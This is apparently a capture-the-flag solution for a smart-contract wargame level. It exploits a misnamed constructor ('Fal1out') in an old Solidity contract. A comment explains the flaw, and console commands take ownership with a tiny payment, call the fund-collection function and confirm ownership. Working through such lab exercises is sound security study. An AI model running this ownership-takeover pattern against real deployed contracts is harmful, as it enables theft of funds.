//in old versions of solidity the constructor keyword was not there, so the vulnerability is the typo in contract name that was intended to be the constructor

await contract.Fal1out.sendTransaction({ from: player, value: toWei('0.000001')}) //make small contribution and become the owner basically
await contract.collectAllocations.call() //get back the contribution
await contract.owner.call() //check that we're the owner